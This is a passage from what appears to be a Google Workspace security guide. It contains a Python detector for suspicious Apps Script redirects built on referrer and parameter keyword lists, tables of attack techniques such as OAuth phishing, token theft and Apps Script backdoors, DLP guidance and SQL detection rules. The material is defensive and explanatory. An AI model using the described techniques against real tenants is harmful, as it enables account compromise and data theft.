deployments\n</code></pre></p> </li> <li> <p>Script URL Monitoring <pre><code># Python script to detect script.google.com redirectors\ndef detect_apps_script_redirectors(proxy_logs):\n    \"\"\"Analyze proxy logs for suspicious script.google.com access\"\"\"\n    suspicious_activities = []\n    \n    for log_entry in proxy_logs:\n        url = log_entry.get('url', '')\n        \n        # Check for script.google.com URLs\n        if 'script.google.com' in url and '/macros/' in url:\n            # Extract request and referrer information\n            referrer = log_entry.get('referrer', '')\n            user_agent = log_entry.get('user_agent', '')\n            user = log_entry.get('user', '')\n            \n            # Check if this is a suspicious pattern\n            if is_suspicious_apps_script_access(url, referrer, user_agent):\n                suspicious_activities.append({\n                    'user': user,\n                    'script_url': url,\n                    'referrer': referrer,\n                    'timestamp': log_entry.get('timestamp')\n                })\n    \n    return suspicious_activities\n\ndef is_suspicious_apps_script_access(url, referrer, user_agent):\n    \"\"\"Determine if Apps Script access follows suspicious patterns\"\"\"\n    # Check for URLs with unusual parameters\n    if 'email=' in url or 'user=' in url or 'account=' in url:\n        return True\n        \n    # Check for unusual referrers\n    suspicious_referrers = ['email', 'mail', 'document', 'login', 'signin']\n    if any(term in referrer.lower() for term in suspicious_referrers):\n        return True\n        \n    # Check for script URLs in suspicious contexts\n    if ('calendar.google.com' in referrer and 'script.google.com' in url) or \\\n       ('mail.google.com' in referrer and 'script.google.com' in url):\n        return True\n        \n    return False\n</code></pre></p> </li> <li> <p>Content Security Policies</p> </li> <li>Implement CSP rules to restrict redirects from script.google.com</li> <li>Configure proxy/firewall rules to inspect script.google.com redirects</li> <li>Deploy browser extensions that analyze redirect chains</li> </ol>"},{"location":"apps-script-security/#implementation-checklist","title":"Implementation Checklist","text":""},{"location":"apps-script-security/#immediate-security-controls","title":"Immediate Security Controls","text":"<ul> <li> Configure Apps Script settings in Admin Console</li> <li> Implement script project inventory process</li> <li> Deploy trigger detection monitoring</li> <li> Create user guidance for script authorization</li> <li> Establish incident response procedure for script-based attacks</li> <li> Configure web app deployment restrictions</li> <li> Implement monitoring for Apps Script phishing techniques</li> </ul>"},{"location":"apps-script-security/#ongoing-maintenance-activities","title":"Ongoing Maintenance Activities","text":"<ul> <li> Weekly review of new script projects and triggers</li> <li> Monthly audit of external data connections from scripts</li> <li> Quarterly review of Apps Script security settings</li> <li> Regular user education updates on script security risks</li> <li> Annual penetration testing including Apps Script attack vectors</li> <li> Conduct Apps Script phishing simulations to test awareness</li> </ul>"},{"location":"apps-script-security/#resources","title":"Resources","text":"<ul> <li>Google Apps Script Developer Documentation</li> <li>Google Workspace Admin Help: Apps Script Settings</li> <li>Apps Script API Documentation</li> <li>Google Workspace Admin SDK</li> <li>OWASP Client-Side Security Guidance</li> </ul> <p>Note: The example code in this document is provided for educational purposes to help security professionals understand and detect malicious Apps Script patterns. All testing should be performed only in authorized environments with proper approvals.</p>"},{"location":"attack-vectors/","title":"Attack Vectors","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"attack-vectors/#common-attack-vectors-and-mitigation-strategies-for-google-workspace","title":"Common Attack Vectors and Mitigation Strategies for Google Workspace","text":"<p>This guide documents prevalent attack vectors targeting Google Workspace environments and provides actionable mitigation strategies for each. It is designed for security professionals and MSPs protecting client environments.</p>"},{"location":"attack-vectors/#1-account-compromise-attacks","title":"1. Account Compromise Attacks","text":""},{"location":"attack-vectors/#attack-techniques","title":"Attack Techniques","text":"Attack Vector Description Indicators Credential Stuffing Automated attempts to use breached passwords across multiple services Multiple failed logins followed by successful login, authentication from unusual locations Phishing Sophisticated emails impersonating Google or trusted parties to steal credentials User reports of suspicious emails, unexpected password reset emails, login from new locations Password Spraying Low-volume attempts using common passwords against multiple accounts Failed login attempts across multiple user accounts with similar patterns Man-in-the-Middle Intercepting traffic between users and Google services Unexpected certificate warnings, login from unusual network paths Session Hijacking Stealing authentication cookies to impersonate authenticated users Multiple concurrent sessions, unusual application access patterns"},{"location":"attack-vectors/#mitigation-strategies","title":"Mitigation Strategies","text":"<ol> <li>Technical Controls</li> <li>Implement Multi-Factor Authentication (MFA) for all users</li> <li>Deploy security keys for high-value accounts</li> <li>Enable enhanced safe browsing features in Chrome</li> <li>Implement DMARC, SPF, and DKIM email authentication</li> <li> <p>Configure account recovery options securely</p> </li> <li> <p>Detection Capabilities</p> </li> <li>Monitor for authentication from unusual locations, devices, or times</li> <li>Create alerts for MFA enrollment changes or disablement</li> <li>Track concurrent sessions across geographically distant locations</li> <li>Monitor for unusual numbers of failed login attempts</li> <li> <p>Implement impossible travel detection</p> </li> <li> <p>User Education</p> </li> <li>Train users to identify phishing attempts</li> <li>Implement phishing simulation exercises</li> <li>Create clear incident reporting procedures</li> <li>Educate on secure password practices</li> <li>Promote awareness of social engineering techniques</li> </ol>"},{"location":"attack-vectors/#2-oauth-and-third-party-application-abuse","title":"2. OAuth and Third-Party Application Abuse","text":""},{"location":"attack-vectors/#attack-techniques_1","title":"Attack Techniques","text":"Attack Vector Description Indicators Malicious Applications Convincing users to authorize malicious apps with excessive permissions Unusual OAuth grants, unfamiliar applications with sensitive scopes OAuth Phishing Targeted phishing specifically designed to trick users into granting OAuth tokens Applications requesting unusual combinations of scopes, OAuth grants to new domains Token Theft Stealing and exploiting OAuth refresh tokens Unexpected application access, authentication from unusual locations using valid tokens Excessive Permissions Legitimate apps requesting more permissions than necessary Applications with read/write scopes when read-only would suffice Shadow IT Applications Unauthorized applications connected to Google Workspace Unknown applications accessing company data, inconsistent authorization patterns"},{"location":"attack-vectors/#mitigation-strategies_1","title":"Mitigation Strategies","text":"<ol> <li>Technical Controls</li> <li>Implement OAuth application allowlisting</li> <li>Restrict third-party access to sensitive Google API scopes</li> <li>Enforce app verification for sensitive scopes</li> <li>Regularly audit and prune authorized applications</li> <li> <p>Implement data access monitoring for third-party apps</p> </li> <li> <p>Detection Capabilities</p> </li> <li>Monitor for new OAuth application authorizations</li> <li>Create alerts for sensitive scope authorizations</li> <li>Track application usage patterns for anomalies</li> <li>Monitor for applications used by only one or few users</li> <li> <p>Implement unusual application behavior detection</p> </li> <li> <p>Governance Controls</p> </li> <li>Develop and enforce an application approval process</li> <li>Create an acceptable third-party application policy</li> <li>Maintain an inventory of approved applications</li> <li>Conduct regular security reviews of connected applications</li> <li>Implement a formal application decommissioning process</li> </ol>"},{"location":"attack-vectors/#3-data-exfiltration-attacks","title":"3. Data Exfiltration Attacks","text":""},{"location":"attack-vectors/#attack-techniques_2","title":"Attack Techniques","text":"Attack Vector Description Indicators Excessive Downloads Downloading unusually large amounts of data from Google services Abnormal volume of Drive downloads, export of entire mailboxes Unusual Sharing Sharing sensitive content externally or with personal accounts Sudden increase in external sharing, sharing sensitive folders Email Forwarding Setting up forwarding rules to external addresses Creation of new mail forwarding rules, especially to personal domains Drive Synchronization Synchronizing company data to unmanaged personal devices New Drive sync clients, sync to unusual devices Takeout Service Abuse Using Google Takeout to extract complete data archives Unexpected Takeout requests, especially from unusual locations"},{"location":"attack-vectors/#mitigation-strategies_2","title":"Mitigation Strategies","text":"<ol> <li>Technical Controls</li> <li>Implement Data Loss Prevention (DLP) policies</li> <li>Restrict external sharing based on content classification</li> <li>Control email forwarding to external domains</li> <li>Set Drive synchronization policies for approved devices</li> <li> <p>Restrict Google Takeout access where appropriate</p> </li> <li> <p>Detection Capabilities</p> </li> <li>Monitor for unusual download volumes or patterns</li> <li>Create alerts for first-time external sharing of sensitive data</li> <li>Track new email forwarding rules</li> <li>Monitor for new device synchronization</li> <li> <p>Implement abnormal data access detection</p> </li> <li> <p>Data Governance</p> </li> <li>Implement data classification and handling policies</li> <li>Conduct regular data access reviews</li> <li>Create clear data sharing guidelines</li> <li>Establish appropriate data retention policies</li> <li>Implement controls aligned with data sensitivity</li> </ol>"},{"location":"attack-vectors/#4-email-based-attacks","title":"4. Email-Based Attacks","text":""},{"location":"attack-vectors/#attack-techniques_3","title":"Attack Techniques","text":"Attack Vector Description Indicators Business Email Compromise Targeted impersonation of executives for fraud Unexpected financial requests, slightly altered sender domains Malware Attachments Malicious payloads delivered via email attachments Unusual file types, attachments with macros, executable content Embedded Links Emails with links to credential phishing or malware sites URLs with typosquatted domains, shortened links, credential submission forms Conversation Hijacking Inserting into existing email threads with malicious content Sudden topic changes in email threads, unexpected attachments in ongoing conversations Email Spoofing Sending emails that appear to come from trusted domains Authentication failures, sender inconsistencies, unusual reply-to addresses"},{"location":"attack-vectors/#mitigation-strategies_3","title":"Mitigation Strategies","text":"<ol> <li>Technical Controls</li> <li>Implement advanced phishing and malware protection</li> <li>Enable enhanced pre-delivery message scanning</li> <li>Configure strict SPF, DKIM, and DMARC policies</li> <li>Implement attachment scanning and sandboxing</li> <li> <p>Deploy link protection and URL rewriting</p> </li> <li> <p>Detection Capabilities</p> </li> <li>Monitor for emails failing authentication checks</li> <li>Create alerts for potential business email compromise patterns</li> <li>Track unusual sending patterns or volumes</li> <li>Implement suspicious attachment detection</li> <li> <p>Monitor for unusual recipient patterns</p> </li> <li> <p>Process Controls</p> </li> <li>Establish out-of-band verification for sensitive requests</li> <li>Create clear procedures for financial authorization</li> <li>Implement policies for handling suspicious emails</li> <li>Conduct regular phishing simulation exercises</li> <li>Establish email security incident response procedures</li> </ol>"},{"location":"attack-vectors/#5-privilege-escalation-attacks","title":"5. Privilege Escalation Attacks","text":""},{"location":"attack-vectors/#attack-techniques_4","title":"Attack Techniques","text":"Attack Vector Description Indicators Admin Account Targeting Focused attacks on administrative users Targeted phishing against admins, unusual admin console access Role Privilege Abuse Exploiting excessive privileges assigned to roles Unexpected administrative actions, privilege use outside job function Delegated Admin Exploitation Abusing partner or delegated admin access Administrative actions from partners outside maintenance windows Developer API Abuse Exploiting API access to elevate privileges Unusual API calls, unexpected permission changes via API Recovery Options Manipulation Changing account recovery information to gain access Modifications to recovery email addresses or phone numbers"},{"location":"attack-vectors/#mitigation-strategies_4","title":"Mitigation Strategies","text":"<ol> <li>Technical Controls</li> <li>Implement strict privileged access management</li> <li>Enforce separation of administrative accounts</li> <li>Apply enhanced security for admin accounts</li> <li>Restrict administrative API access</li> <li> <p>Implement time-bound admin access</p> </li> <li> <p>Detection Capabilities</p> </li> <li>Monitor all administrative actions</li> <li>Create alerts for unusual administrative behavior</li> <li>Track role and privilege changes</li> <li>Implement privileged account usage monitoring</li> <li> <p>Alert on recovery option changes for sensitive accounts</p> </li> <li> <p>Administrative Policies</p> </li> <li>Implement and enforce least privilege principles</li> <li>Conduct regular privilege access reviews</li> <li>Create clear administrative access request procedures</li> <li>Establish emergency access protocols</li> <li>Document privileged account inventory</li> </ol>"},{"location":"attack-vectors/#6-lateral-movement-techniques","title":"6. Lateral Movement Techniques","text":""},{"location":"attack-vectors/#attack-techniques_5","title":"Attack Techniques","text":"Attack Vector Description Indicators Service Account Pivoting Using compromised service accounts to move between systems Service account usage from unusual sources, credential reuse OAuth Token Abuse Using stolen tokens to access multiple interconnected services Access to multiple services in rapid succession, unusual service combinations Shared Document Exploitation Using document sharing to deliver malicious content Unusual internal sharing patterns, documents with suspicious macros or links Cross-Application Movement Leveraging access to one Google service to compromise others Unexpected cross-service access patterns, rapid pivoting between services Workspace Add-on Abuse Exploiting authorized add-ons to gain additional access Add-on behavior changes, unusual data access by add-ons"},{"location":"attack-vectors/#mitigation-strategies_5","title":"Mitigation Strategies","text":"<ol> <li>Technical Controls</li> <li>Implement service boundaries and segmentation</li> <li>Control service account permissions strictly</li> <li>Limit sharing capabilities based on data classification</li> <li>Configure add-on restrictions and approvals</li> <li> <p>Implement context-aware access controls</p> </li> <li> <p>Detection Capabilities</p> </li> <li>Monitor for unusual cross-service access patterns</li> <li>Create alerts for anomalous service account usage</li> <li>Track document access and sharing patterns</li> <li>Implement service-to-service connection monitoring</li> <li> <p>Monitor for unusual add-on behavior</p> </li> <li> <p>Security Architecture</p> </li> <li>Design service boundaries with security in mind</li> <li>Segment data and services by sensitivity</li> <li>Implement zero trust principles for service access</li> <li>Create clear data flow diagrams and controls</li> <li>Establish service-to-service authentication requirements</li> </ol>"},{"location":"attack-vectors/#7-persistence-mechanisms","title":"7. Persistence Mechanisms","text":""},{"location":"attack-vectors/#attack-techniques_6","title":"Attack Techniques","text":"Attack Vector Description Indicators Secondary Account Creation Creating additional accounts for persistent access New account creation outside standard processes, accounts with similar names to existing users App Script Backdoors Implementing malicious Google Apps Scripts Unexpected script creation or modification, scripts with unusual permissions or triggers Rogue App Deployment Deploying unauthorized applications with persistent access New application deployments outside change control, applications with unusual permissions Mail Rules and Filters Establishing email rules to hide detection communications Creation of unusual mail filtering rules, rules that hide specific senders or subjects OAuth Persistence Maintaining persistent access via authorized applications Applications with long-lived tokens, unusual refresh token usage"},{"location":"attack-vectors/#mitigation-strategies_6","title":"Mitigation Strategies","text":"<ol> <li>Technical Controls</li> <li>Implement strict user provisioning controls</li> <li>Control Apps Script creation and permissions</li> <li>Restrict application deployment capabilities</li> <li>Monitor and control email rule creation</li> <li> <p>Implement token lifetime limitations</p> </li> <li> <p>Detection Capabilities</p> </li> <li>Monitor for unauthorized account creation</li> <li>Create alerts for suspicious script activities</li> <li>Track application deployment outside normal processes</li> <li>Implement mail rule change monitoring</li> <li> <p>Monitor for unusual OAuth token persistence</p> </li> <li> <p>Operational Security</p> </li> <li>Conduct regular account reviews and reconciliation</li> <li>Implement formal application deployment processes</li> <li>Create clear deprovisioning procedures</li> <li>Establish script development and review guidelines</li> <li>Conduct regular environment security scanning</li> </ol>"},{"location":"attack-vectors/#msp-specific-attack-surface-considerations","title":"MSP-Specific Attack Surface Considerations","text":"<p>For MSPs managing multiple Google Workspace tenants, additional attack vectors include:</p>"},{"location":"attack-vectors/#partner-account-compromise","title":"Partner Account Compromise","text":"<ul> <li>Attack: Targeting MSP staff accounts with partner/reseller privileges</li> <li>Impact: Potential access to multiple client environments</li> <li>Mitigation:</li> <li>Implement enhanced MFA for all partner accounts</li> <li>Restrict partner admin capabilities to least required privilege</li> <li>Create partner-level activity monitoring and alerting</li> <li>Establish strict partner access request and approval processes</li> <li>Conduct regular partner privilege reviews</li> </ul>"},{"location":"attack-vectors/#cross-tenant-attack-propagation","title":"Cross-Tenant Attack Propagation","text":"<ul> <li>Attack: Using compromised access in one tenant to pivot to others</li> <li>Impact: Multiple client compromise from single initial access</li> <li>Mitigation:</li> <li>Implement strong tenant isolation practices</li> <li>Create separate administrative accounts per tenant</li> <li>Avoid credential reuse across client environments</li> <li>Establish cross-tenant security monitoring</li> <li>Implement tenant-specific security baselines</li> </ul>"},{"location":"attack-vectors/#incident-response-considerations","title":"Incident Response Considerations","text":"<p>When responding to Google Workspace security incidents:</p> <ol> <li>Initial Assessment</li> <li>Identify affected accounts and services</li> <li>Determine authentication indicators (IP, device, location)</li> <li>Assess timeline of suspicious activities</li> <li>Evaluate data access and potential exfiltration</li> <li> <p>Identify potential persistence mechanisms</p> </li> <li> <p>Containment Steps</p> </li> <li>Force account sign-out for affected users</li> <li>Implement temporary access restrictions</li> <li>Reset passwords for affected accounts</li> <li>Revoke suspicious OAuth tokens</li> <li> <p>Block suspicious IP addresses</p> </li> <li> <p>Recovery Actions</p> </li> <li>Restore from backups if necessary</li> <li>Remediate any discovered persistence mechanisms</li> <li>Re-establish proper permissions and access controls</li> <li>Conduct post-recovery security assessment</li> <li>Implement additional preventative controls</li> </ol>"},{"location":"attack-vectors/#threat-intelligence-resources","title":"Threat Intelligence Resources","text":"<ul> <li>Google Workspace Security Alerts</li> <li>Google Safe Browsing</li> <li>CISA Threat Advisories</li> <li>MITRE ATT&amp;CK Cloud Techniques</li> <li>Cloud Security Alliance Threat List</li> </ul> <p>Note: This guide should be regularly updated to reflect emerging attack techniques and mitigation strategies.</p>"},{"location":"data-protection/","title":"Data Protection","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"data-protection/#data-protection-in-google-workspace","title":"Data Protection in Google Workspace","text":"<p>This guide provides comprehensive strategies for implementing robust data protection in Google Workspace environments, with a focus on data loss prevention, access controls, and encryption.</p>"},{"location":"data-protection/#understanding-the-data-protection-landscape","title":"Understanding the Data Protection Landscape","text":"<p>Data protection in Google Workspace encompasses multiple layers of security controls designed to:</p> <ul> <li>Prevent unauthorized access to sensitive information</li> <li>Detect and prevent data exfiltration</li> <li>Ensure appropriate data handling based on classification</li> <li>Maintain compliance with regulatory requirements</li> <li>Protect data in transit and at rest</li> </ul>"},{"location":"data-protection/#data-loss-prevention-dlp","title":"Data Loss Prevention (DLP)","text":""},{"location":"data-protection/#core-dlp-capabilities","title":"Core DLP Capabilities","text":"<p>Google Workspace provides several native DLP capabilities that should be configured for optimal protection:</p>"},{"location":"data-protection/#gmail-dlp-rules","title":"Gmail DLP Rules","text":"<ul> <li>Content matching: Configure DLP rules to detect sensitive content patterns in emails</li> <li>Attachment scanning: Enable scanning of attachments for sensitive information</li> <li>Predefined detectors: Utilize Google's predefined content detectors for PII, financial data, etc.</li> <li>Custom detectors: Create organization-specific detectors for internal sensitive information</li> <li>Quarantine actions: Automatically quarantine emails containing sensitive information</li> <li>Notification workflows: Alert security teams when DLP violations occur</li> </ul>"},{"location":"data-protection/#drive-dlp-controls","title":"Drive DLP Controls","text":"<ul> <li>Real-time scanning: Configure scanning of documents upon upload or modification</li> <li>Sharing restrictions: Implement automatic blocking of external sharing for sensitive content</li> <li>Classification labels: Apply visual markings to indicate document sensitivity</li> <li>Content inspection: Deep inspection of various file formats for sensitive data</li> <li>Remediation actions: Define automated responses to DLP violations</li> </ul>"},{"location":"data-protection/#enhanced-dlp-implementation","title":"Enhanced DLP Implementation","text":"<p>For organizations requiring more sophisticated DLP capabilities:</p> <ul> <li>Cross-platform policies: Implement consistent DLP policies across Gmail, Drive, and Chat</li> <li>Context-aware rules: Consider sender, recipient, and content context in enforcement decisions</li> <li>Integration with third-party DLP: Supplement native controls with specialized DLP tools</li> <li>DLP bypass controls: Procedures for authorized exception handling</li> <li>False positive management: Processes to handle and reduce false positives</li> </ul>"},{"location":"data-protection/#dlp-policy-design-framework","title":"DLP Policy Design Framework","text":"<p>Develop a tiered approach to DLP policy implementation:</p>"},{"location":"data-protection/#tier-1-essential-protection-minimum-requirements","title":"Tier 1: Essential Protection (Minimum Requirements)","text":"<ul> <li>High-confidence PII detection (SSNs, credit card numbers, etc.)</li> <li>Regulatory compliance detection (HIPAA, PCI, etc.)</li> <li>Quarantine of obviously sensitive outbound content</li> </ul>"},{"location":"data-protection/#tier-2-enhanced-protection","title":"Tier 2: Enhanced Protection","text":"<ul> <li>Business confidential information detection</li> <li>Context-aware scanning for authorized vs. unauthorized sharing</li> <li>Granular remediation actions based on severity</li> <li>Integration with user education workflows</li> </ul>"},{"location":"data-protection/#tier-3-advanced-protection","title":"Tier 3: Advanced Protection","text":"<ul> <li>Machine learning-based anomaly detection for data movement</li> <li>Behavior-based exfiltration detection</li> <li>Integration with third-party security tools</li> <li>Comprehensive audit and forensic capabilities</li> </ul>"},{"location":"data-protection/#dlp-monitoring-and-maintenance","title":"DLP Monitoring and Maintenance","text":"<ul> <li>Regular rule review: Schedule quarterly reviews of DLP rule effectiveness</li> <li>False positive tracking: Monitor and refine rules with high false positive rates</li> <li>Gap analysis: Continuously identify unaddressed data protection needs</li> <li>Regulatory updates: Adjust policies to reflect changing compliance requirements</li> <li>DLP incident reviews: Conduct post-mortems on significant DLP events</li> </ul>"},{"location":"data-protection/#access-controls","title":"Access Controls","text":""},{"location":"data-protection/#principles-of-data-access-control","title":"Principles of Data Access Control","text":"<p>Implement a comprehensive framework for data access governance:</p> <ul> <li>Least privilege: Grant minimum necessary access to perform job functions</li> <li>Separation of duties: Prevent concentration of access in any single role</li> <li>Just-in-time access: Provide temporary elevated access when needed</li> <li>Zero standing access: Minimize permanent access to sensitive systems</li> <li>Risk-based access decisions: Scale restrictions based on data sensitivity</li> </ul>"},{"location":"data-protection/#drive-and-document-access-controls","title":"Drive and Document Access Controls","text":"<ul> <li>Folder structure governance: Design secure folder hierarchies with inherited permissions</li> <li>Drive sharing restrictions: Configure domain-level sharing restrictions</li> <li>Link sharing controls: Set appropriate defaults and restrictions for link sharing</li> <li>Access expiration: Implement time-based access expiration for sensitive content</li> <li>External sharing reviews: Regular audits of externally shared content</li> </ul>"},{"location":"data-protection/#third-party-application-access-controls","title":"Third-Party Application Access Controls","text":"<ul> <li>App access verification: Review and approve applications with data access</li> <li>OAuth scope limitation: Restrict permitted scopes for third-party applications</li> <li>OAuth token lifecycle management: Policies for revoking unused or excessive tokens</li> <li>Data transfer risk assessment: Evaluate applications that transfer data outside Workspace</li> </ul>"},{"location":"data-protection/#shared-drive-security","title":"Shared Drive Security","text":"<ul> <li>Membership management: Governance processes for Shared Drive membership</li> <li>Content manager restrictions: Limit Content Manager role to appropriate users</li> <li>Theme-based organization: Organize Shared Drives by function and sensitivity</li> <li>Metadata-based classification: Use consistent labeling for sensitive Shared Drives</li> <li>Shared Drive monitoring: Regular reviews of membership and content</li> </ul>"},{"location":"data-protection/#information-rights-management","title":"Information Rights Management","text":""},{"location":"data-protection/#document-control-strategies","title":"Document Control Strategies","text":"<ul> <li>Access revocation: Procedures for removing access when no longer needed</li> <li>Print/download restrictions: Controls to prevent local copies of sensitive information</li> <li>Watermarking: Visual identification of confidential documents</li> <li>Version control: Tracking changes and maintaining document history</li> <li>Classification labels: Visual indicators of document sensitivity</li> </ul>"},{"location":"data-protection/#advanced-document-controls","title":"Advanced Document Controls","text":"<ul> <li>Dynamic access evaluation: Continuous authorization through context-aware access</li> <li>Activity monitoring: Track unusual document access patterns</li> <li>Viewer restrictions: Force \"Preview only\" mode for highly sensitive content</li> <li>Offline access controls: Manage when documents can be accessed without internet</li> <li>Mobile device restrictions: Special handling for mobile access to sensitive data</li> </ul>"},{"location":"data-protection/#encryption-management","title":"Encryption Management","text":""},{"location":"data-protection/#transport-encryption","title":"Transport Encryption","text":"<ul> <li>TLS enforcement: Configure mandatory TLS for mail transport</li> <li>S/MIME implementation: Configure S/MIME for encrypted email when required</li> <li>Client-side encryption: Options for end-to-end encrypted communications</li> <li>Secure connection requirements: Enforce secure connections for service access</li> </ul>"},{"location":"data-protection/#data-at-rest-encryption","title":"Data at Rest Encryption","text":"<ul> <li>Google's default encryption: Understanding Google's encryption model</li> <li>Customer-managed encryption keys (CMEK): Implementation considerations</li> <li>Customer-supplied encryption keys (CSEK): Use cases and management approaches</li> <li>CMEK rotation policies: Procedures for regular key rotation</li> <li>Key management integration: Working with external key management systems</li> </ul>"},{"location":"data-protection/#end-to-end-encryption-options","title":"End-to-End Encryption Options","text":"<ul> <li>Client-side encryption: Integration with client-side encryption tools</li> <li>Gmail encryption options: S/MIME and third-party encryption tools</li> <li>Drive encryption limitations: Understanding what cannot be protected</li> <li>Confidential mode: Using Gmail's confidential mode effectively</li> <li>Third-party solutions: Integration with specialized encryption services</li> </ul>"},{"location":"data-protection/#msp-specific-data-protection-strategies","title":"MSP-Specific Data Protection Strategies","text":"<p>For MSPs managing multiple Google Workspace tenants:</p> <ul> <li>Cross-tenant DLP standardization: Common DLP implementations across clients</li> <li>Client-specific risk models: Tailored controls based on client data sensitivity</li> <li>Delegated data protection monitoring: MSP oversight of client data protection</li> <li>Template-based implementation: Standardized data protection deployment models</li> <li>Tiered service offerings: Scalable data protection services based on client needs</li> </ul>"},{"location":"data-protection/#compliance-frameworks-integration","title":"Compliance Frameworks Integration","text":""},{"location":"data-protection/#regulatory-alignment","title":"Regulatory Alignment","text":"<ul> <li>GDPR compliance: Data protection controls specific to GDPR requirements</li> <li>HIPAA compliance: Controls for protecting healthcare information</li> <li>PCI DSS requirements: Protection of payment card information</li> <li>Industry-specific regulations: Addressing unique regulatory requirements</li> <li>Cross-border data protection: Managing global data residency requirements</li> </ul>"},{"location":"data-protection/#compliance-validation-and-reporting","title":"Compliance Validation and Reporting","text":"<ul> <li>Regular compliance assessments: Scheduled reviews of data protection effectiveness</li> <li>Evidence collection: Processes for gathering compliance documentation</li> <li>Audit support procedures: Preparation for internal and external audits</li> <li>Remediation tracking: Managing identified compliance gaps</li> <li>Attestation documentation: Maintaining evidence of compliance</li> </ul>"},{"location":"data-protection/#implementation-checklist","title":"Implementation Checklist","text":"<ul> <li> Configure Gmail DLP rules for sensitive content detection</li> <li> Implement Drive DLP policies for sensitive document protection</li> <li> Establish appropriate sharing restrictions for organizational data</li> <li> Configure S/MIME or other transport encryption as required</li> <li> Implement customer-managed encryption keys if needed</li> <li> Create and enforce document access policies</li> <li> Establish regular reviews of externally shared content</li> <li> Implement classification labels for sensitive information</li> <li> Configure third-party application access controls</li> <li> Create data protection incident response procedures</li> <li> Establish regular compliance validation processes</li> <li> Document and test data protection controls</li> </ul>"},{"location":"data-protection/#data-protection-incident-response","title":"Data Protection Incident Response","text":""},{"location":"data-protection/#common-scenarios","title":"Common Scenarios","text":""},{"location":"data-protection/#unauthorized-data-sharing","title":"Unauthorized Data Sharing","text":"<p>Response steps: 1. Identify affected content and scope of exposure 2. Revoke inappropriate sharing permissions 3. Assess potential data breach implications 4. Document incident details and response actions 5. Implement remediation measures to prevent recurrence</p>"},{"location":"data-protection/#dlp-rule-violations","title":"DLP Rule Violations","text":"<p>Response steps: 1. Review triggered DLP rule and identified content 2. Assess whether true violation or false positive 3. Take appropriate action based on content sensitivity 4. Review with content owner and document resolution 5. Update DLP rules if needed to improve accuracy</p>"},{"location":"data-protection/#suspicious-download-activity","title":"Suspicious Download Activity","text":"<p>Response steps: 1. Identify scope of downloaded content 2. Review access logs for suspicious patterns 3. Temporarily suspend access if warranted 4. Engage with user to determine legitimacy 5. Document findings and implement necessary controls</p>"},{"location":"data-protection/#resources","title":"Resources","text":"<ul> <li>Google Workspace DLP Documentation</li> <li>Google Cloud Key Management Service</li> <li>Google Workspace Security Whitepaper</li> <li>NIST 800-171 Compliance Guide</li> <li>GDPR Data Protection Requirements</li> </ul> <p>Note: This guide should be adapted to your organization's specific needs and risk profile.</p>"},{"location":"detection-rules/","title":"Detection Rules","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"detection-rules/#automated-detection-rules-for-google-workspace","title":"Automated Detection Rules for Google Workspace","text":"<p>This guide provides detailed, implementable detection rules for identifying suspicious and malicious activities in Google Workspace environments. These rules can be implemented in SIEM systems, Google Security Center, or custom monitoring solutions.</p>"},{"location":"detection-rules/#understanding-detection-engineering-for-google-workspace","title":"Understanding Detection Engineering for Google Workspace","text":"<p>Effective detection in Google Workspace environments requires a strategic approach that combines:</p> <ul> <li>Log data collection from multiple Google services</li> <li>Well-crafted detection logic with appropriate thresholds</li> <li>Baseline understanding of normal user behavior</li> <li>Tuning to reduce false positives while maintaining detection efficacy</li> <li>Regular updates to address emerging threats</li> </ul>"},{"location":"detection-rules/#detection-rule-components","title":"Detection Rule Components","text":"<p>Each detection rule in this guide includes:</p> <ul> <li>Rule name: Clear, descriptive name</li> <li>MITRE ATT&amp;CK mapping: Relevant tactics and techniques</li> <li>Data sources: Required log sources</li> <li>Detection logic: Specific conditions to trigger alerts</li> <li>Severity: Recommended alert priority (Critical, High, Medium, Low)</li> <li>False positive scenarios: Common benign triggers</li> <li>Validation steps: How to validate true positives</li> <li>Response actions: Recommended investigation steps</li> </ul>"},{"location":"detection-rules/#implementation-platforms","title":"Implementation Platforms","text":"<p>These rules can be implemented on:</p> <ul> <li>Google Security Center: Natively in Google Workspace</li> <li>SIEM platforms: Splunk, Microsoft Sentinel, Elastic, etc.</li> <li>Cloud logging solutions: Google Cloud Logging, BigQuery</li> <li>Custom detection tools: Internally developed monitoring solutions</li> <li>Third-party GWS monitoring tools: Specialized Google Workspace security tools</li> </ul>"},{"location":"detection-rules/#core-detection-rules","title":"Core Detection Rules","text":""},{"location":"detection-rules/#authentication-access","title":"Authentication &amp; Access","text":""},{"location":"detection-rules/#impossible-travel-detection","title":"Impossible Travel Detection","text":"<p>Rule name: GWS-AUTH-001: Authentication Impossible Travel</p> <p>MITRE ATT&amp;CK: Initial Access (T1078), Valid Accounts</p> <p>Data sources: Login audit logs</p> <p>Detection logic: <pre><code>SELECT \n  user_email,\n  timestamp AS current_login_time,\n  ip_address AS current_ip,\n  country AS current_country,\n  LAG(timestamp) OVER (PARTITION BY user_email ORDER BY timestamp) AS previous_login_time,\n  LAG(ip_address) OVER (PARTITION BY user_email ORDER BY timestamp) AS previous_ip,\n  LAG(country) OVER (PARTITION BY user_email ORDER BY timestamp) AS previous_country,\n  TIMESTAMP_DIFF(timestamp, LAG(timestamp) OVER (PARTITION BY user_email ORDER BY timestamp), MINUTE) AS minutes_between_logins\nFROM login_events\nWHERE timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\nHAVING \n  previous_country IS NOT NULL \n  AND current_country != previous_country \n  AND minutes_between_logins &lt; 240  /* 4 hours */\n  AND previous_country NOT IN ('UNKNOWN', '')\n  AND current_country NOT IN ('UNKNOWN', '')\n</code></pre></p> <p>Severity: High</p> <p>False positive scenarios: - VPN usage causing location changes - Corporate travel with connections in transit - Inaccurate IP geolocation data</p> <p>Validation steps: 1. Verify user travel status with HR or manager 2. Check if user is using VPN services 3. Confirm device used for authentication 4. Review activity following the suspicious login</p> <p>Response actions: 1. Reset user password and enforce re-authentication 2. Review account activity for signs of compromise 3. If confirmed suspicious, initiate incident response 4. Consider implementing location-based access restrictions</p>"},{"location":"detection-rules/#brute-force-authentication-attempts","title":"Brute Force Authentication Attempts","text":"<p>Rule name: GWS-AUTH-002: Authentication Brute Force Attempt</p> <p>MITRE ATT&amp;CK: Credential Access (T1110), Brute Force</p> <p>Data sources: Login audit logs</p> <p>Detection logic: <pre><code>SELECT \n  user_email,\n  ip_address,\n  